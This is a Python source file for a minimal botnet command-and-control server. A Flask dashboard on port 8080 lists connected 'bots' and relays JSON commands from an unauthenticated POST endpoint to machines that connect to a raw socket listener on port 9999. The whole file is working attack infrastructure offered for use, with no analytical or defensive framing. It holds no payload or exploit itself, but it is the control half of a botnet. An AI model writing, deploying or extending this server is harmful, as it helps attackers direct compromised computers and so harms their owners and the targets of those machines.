"""
C2 Server - Command and Control
"""
from flask import Flask, request, jsonify
import socket
import threading
import json
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class BotSession:
    def __init__(self, client_socket, addr, bot_id):
        self.socket = client_socket
        self.addr = addr
        self.bot_id = bot_id
        self.status = "connected"
        self.last_heartbeat = datetime.now()
    
    def send_command(self, command):
        try:
            msg = json.dumps(command).encode('utf-8')
            self.socket.send(msg)
            return True
        except:
            return False

# Global bot registry
bots = {}

@app.route('/')
def dashboard():
    return "C2 Server Dashboard"

@app.route('/api/bots', methods=['GET'])
def get_bots():
    return jsonify({bot_id: bot.status for bot_id, bot in bots.items()})

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')
    
    if bot_id in bots:
        bots[bot_id].send_command(command)
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error'}), 404

def start_c2_socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    logger.info("[*] C2 Socket Server listening on port 9999")
    
    while True:
        try:
            client_socket, addr = server.accept()
            bot_id = f"bot_{addr[0]}"
            logger.info(f"[+] Bot connected: {bot_id}")
            
            session = BotSession(client_socket, addr, bot_id)
            bots[bot_id] = session
        except Exception as e:
            logger.error(f"Error: {e}")

if __name__ == '__main__':
    # Start socket server in background
    socket_thread = threading.Thread(target=start_c2_socket_server, daemon=True)
    socket_thread.start()
    
    # Start Flask app
    logger.info("[*] C2 Server starting Flask dashboard on port 8080")
    app.run(host='0.0.0.0', port=8080, debug=False)